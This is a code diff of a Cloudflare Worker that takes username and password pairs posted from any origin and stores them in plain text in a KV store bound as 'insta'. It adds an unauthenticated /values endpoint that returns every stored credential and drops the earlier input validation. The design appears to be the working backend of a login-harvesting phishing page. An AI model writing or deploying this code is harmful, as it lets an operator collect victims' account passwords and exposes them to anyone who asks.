@@ -1,50 +1,65 @@
-// Cloudflare Worker Code
-const kvNamespace = insta; // Enter your KV namespace binding name
+const kvNamespace = insta; // Make sure this is the correct binding name for your KV
+
+async function handleLoginRequest(request) {
+    try {
+        const { username, password } = await request.json();
+
+        // Save to KV store (replace with your logic)
+        await kvNamespace.put(username, password); // Change this line if you want a different storage mechanism
+
+        return new Response(JSON.stringify({ success: true }), {
+            headers: {
+                'Content-Type': 'application/json',
+                'Access-Control-Allow-Origin': '*', // Allow CORS
+                'Access-Control-Allow-Methods': 'POST, GET', // Allow methods
+            },
+        });
+    } catch (error) {
+        return new Response(JSON.stringify({ success: false, error: error.message }), {
+            status: 500,
+            headers: {
+                'Content-Type': 'application/json',
+                'Access-Control-Allow-Origin': '*',
+            },
+        });
+    }
+}
+
+async function handleGetValuesRequest() {
+    try {
+        const keys = await kvNamespace.list(); // Get all keys
+        const values = await Promise.all(
+            keys.keys.map(async (key) => {
+                const value = await kvNamespace.get(key.name);
+                return { key: key.name, value }; // Store key and its value
+            })
+        );
+
+        return new Response(JSON.stringify(values), {
+            headers: {
+                'Content-Type': 'application/json',
+                'Access-Control-Allow-Origin': '*',
+            },
+        });
+    } catch (error) {
+        return new Response(JSON.stringify({ success: false, error: error.message }), {
+            status: 500,
+            headers: {
+                'Content-Type': 'application/json',
+                'Access-Control-Allow-Origin': '*',
+            },
+        });
+    }
+}
 
 addEventListener('fetch', event => {
-    event.respondWith(handleRequest(event.request));
+    const url = new URL(event.request.url);
+    
+    if (event.request.method === 'POST' && url.pathname === '/') {
+        event.respondWith(handleLoginRequest(event.request));
+    } else if (event.request.method === 'GET' && url.pathname === '/values') {
+        event.respondWith(handleGetValuesRequest());
+    } else {
+        event.respondWith(new Response('Not Found', { status: 404 }));
+    }
 });
-
-async function handleRequest(request) {
-    if (request.method === 'OPTIONS') {
-        return new Response('', {
-            status: 204,
-            headers: {
-                'Access-Control-Allow-Origin': '*',
-                'Access-Control-Allow-Methods': 'POST, OPTIONS',
-                'Access-Control-Allow-Headers': 'Content-Type',
-            },
-        });
-    }
-
-    if (request.method === 'POST') {
-        const data = await request.json();
-        const { username, password } = data;
-
-        // Validate the inputs
-        if (!username || !password) {
-            return new Response(JSON.stringify({ success: false, message: 'Invalid input' }), {
-                status: 400,
-                headers: {
-                    'Access-Control-Allow-Origin': '*',
-                    'Content-Type': 'application/json',
-                },
-            });
-        }
-
-        // Store the values in KV
-        await kvNamespace.put(username, password);
-
-        // Respond with success
-        return new Response(JSON.stringify({ success: true }), {
-            status: 200,
-            headers: {
-                'Access-Control-Allow-Origin': '*',
-                'Content-Type': 'application/json',
-            },
-        });
-    }
-
-    // If method is not POST, return a method not allowed response
-    return new Response('Method Not Allowed', { status: 405 });
-}
